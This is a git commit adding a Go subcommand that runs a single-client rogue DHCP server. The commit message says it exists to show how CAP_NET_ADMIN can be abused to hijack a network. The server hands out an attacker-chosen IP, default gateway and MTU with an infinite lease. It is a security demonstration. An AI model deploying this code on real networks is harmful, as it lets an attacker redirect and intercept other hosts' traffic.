a0ef4af37e5d57c0076c5925bfc5f954629f60f3
Miguel Duarte Barroso <mdbarroso@redhat.com>
2021-01-08 16:24:51 +0100

    Showcase how CAP_NET_ADMIN can be exploited to highjack the network
    Signed-off-by: Miguel Duarte Barroso <mdbarroso@redhat.com>

--- cmd/main.go
+++ cmd/main.go
@@ -1,6 +1,7 @@
 package main
 
 import (
+	"encoding/binary"
 	"flag"
 	"fmt"
 	"net"
@@ -8,6 +9,8 @@ import (
 	"time"
 
 	"github.com/golang/glog"
+	dhcp "github.com/krolaw/dhcp4"
+	dhcpConn "github.com/krolaw/dhcp4/conn"
 	"github.com/spf13/cobra"
 
 	"golang.org/x/sys/unix"
@@ -98,11 +101,137 @@ func main() {
 		},
 	}
 
+	startDhcpServer := &cobra.Command{
+		Use:  "start-dhcp-server",
+		Args: cobra.MinimumNArgs(1),
+		RunE: func(cmd *cobra.Command, args []string) error {
+			ifaceName := args[0]
+			cidr := cmd.Flag("cidr").Value.String()
+			ip, ipNet, err := net.ParseCIDR(cidr)
+			if err != nil {
+				return fmt.Errorf("error parsing CIDR: %v", err)
+			}
+
+			defaultGwIP, err := cmd.Flags().GetIP("ip-router")
+			if err != nil {
+				return fmt.Errorf("error parsing default GW IP: %v", err)
+			}
+
+			serverIP, err := cmd.Flags().GetIP("ip-server")
+			if err != nil {
+				return fmt.Errorf("error parsing server IP: %v", err)
+			}
+
+			mtu, err := cmd.Flags().GetUint16("mtu")
+			if err != nil {
+				return fmt.Errorf("error parsing MTU: %v", err)
+			}
+
+			err = SingleClientDHCPServer(ip, ipNet.Mask, ifaceName, serverIP, defaultGwIP, mtu)
+			if err != nil {
+				return fmt.Errorf("woop: %v", err)
+			}
+
+			return nil
+		},
+	}
+
 	bindToDevice.Flags().Uint("port", 547, "specify the port to bind to")
-	rootCmd.AddCommand(createRawSocket, bindToDevice)
+	startDhcpServer.Flags().String("mac-addr", "", "the MAC address of the DHCP server")
+	startDhcpServer.Flags().String("cidr", "", "the IP address to advertise")
+	startDhcpServer.Flags().IP("ip-server", net.IP{}, "the IP address of the advertising server")
+	startDhcpServer.Flags().IP("ip-router", net.IP{}, "the IP address of the router")
+	startDhcpServer.Flags().Uint16("mtu", 1280, "the MTU to advertise")
+	rootCmd.AddCommand(createRawSocket, bindToDevice, startDhcpServer)
 
 	if err := rootCmd.Execute(); err != nil {
 		_, _ = fmt.Fprintln(os.Stderr, err)
 		os.Exit(1)
+	}
+}
+
+func SingleClientDHCPServer(
+	clientIP net.IP,
+	clientMask net.IPMask,
+	serverIface string,
+	serverIP net.IP,
+	routerIP net.IP,
+	mtu uint16) error {
+
+	glog.Info("Starting SingleClientDHCPServer")
+
+	hostname, err := os.Hostname()
+	if err != nil {
+		return fmt.Errorf("reading the pods hostname failed: %v", err)
+	}
+
+	options, err := prepareDHCPOptions(clientMask, routerIP, mtu, hostname)
+	if err != nil {
+		return err
+	}
+
+	handler := &DHCPHandler{
+		clientIP:      clientIP,
+		serverIP:      serverIP.To4(),
+		leaseDuration: infiniteLease,
+		options:       options,
+	}
+
+	l, err := dhcpConn.NewUDP4BoundListener(serverIface, ":67")
+	if err != nil {
+		return err
+	}
+	defer l.Close()
+	err = dhcp.Serve(l, handler)
+	if err != nil {
+		return err
+	}
+	return nil
+}
+
+func prepareDHCPOptions(
+	clientMask net.IPMask,
+	routerIP net.IP,
+	mtu uint16,
+	hostname string) (dhcp.Options, error) {
+
+	mtuArray := make([]byte, 2)
+	binary.BigEndian.PutUint16(mtuArray, mtu)
+
+	dhcpOptions := dhcp.Options{
+		dhcp.OptionSubnetMask:   []byte(clientMask),
+		dhcp.OptionRouter:       []byte(routerIP),
+		dhcp.OptionInterfaceMTU: mtuArray,
+	}
+
+	dhcpOptions[dhcp.OptionHostName] = []byte(hostname)
+
+	return dhcpOptions, nil
+}
+
+type DHCPHandler struct {
+	serverIP      net.IP
+	clientIP      net.IP
+	leaseDuration time.Duration
+	options       dhcp.Options
+}
+
+func (h *DHCPHandler) ServeDHCP(p dhcp.Packet, msgType dhcp.MessageType, options dhcp.Options) (d dhcp.Packet) {
+	glog.Info("Serving a new request")
+	switch msgType {
+	case dhcp.Discover:
+		glog.Info("The request has message type DISCOVER")
+		return dhcp.ReplyPacket(p, dhcp.Offer, h.serverIP, h.clientIP, h.leaseDuration,
+			h.options.SelectOrderOrAll(nil))
+
+	case dhcp.Request:
+		glog.Info("The request has message type REQUEST")
+		return dhcp.ReplyPacket(p, dhcp.ACK, h.serverIP, h.clientIP, h.leaseDuration,
+			h.options.SelectOrderOrAll(nil))
+
+	default:
+		glog.Info("The request has unhandled message type")
+		return nil // Ignored message type
+
 	}
 }
--- go.mod
+++ go.mod
@@ -4,6 +4,7 @@ go 1.14
 
 require (
 	github.com/golang/glog v0.0.0-20160126235308-23def4e6c14b
+	github.com/krolaw/dhcp4 v0.0.0-20190909130307-a50d88189771
 	github.com/spf13/cobra v1.1.1
 	golang.org/x/sys v0.0.0-20210105210732-16f7687f5001
 )
